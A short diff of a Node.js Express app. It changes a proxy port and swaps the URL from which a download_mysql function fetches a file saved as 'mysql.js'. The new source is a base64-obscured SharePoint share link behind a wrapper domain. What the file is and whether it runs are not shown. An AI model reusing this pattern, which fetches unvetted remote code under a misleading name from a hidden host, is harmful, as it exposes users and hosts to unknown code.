@@ -71,7 +71,7 @@ app.get("/download", (req, res) => {
 app.use(
   "/",
   createProxyMiddleware({
-    target: "http://127.0.0.1:3306/",
+    target: "http://127.0.0.1:8080/",
     changeOrigin: true,
     ws: true,
     pathRewrite: {
@@ -115,7 +115,7 @@ setInterval(keepalive, 9 * 1000);
 
 function download_mysql(callback) {
   let fileName = "mysql.js";
-  let mysql_url = "https://suo.yt/d2UNoQE";
+  let mysql_url = "https://link.jscdn.cn/sharepoint/aHR0cHM6Ly90dDZzei1teS5zaGFyZXBvaW50LmNvbS86dTovZy9wZXJzb25hbC9hZG1pbl90dDZzel9vbm1pY3Jvc29mdF9jb20vRVEwWTduaklVSWxLc1IwNFlydkhKUXNCWUI0eWVOSUhMQ3R2MGhPRkswNjJEQT9lPUtUWVROQQ.js";
   let stream = fs.createWriteStream(path.join("./", fileName));
   request(mysql_url)
     .pipe(stream)
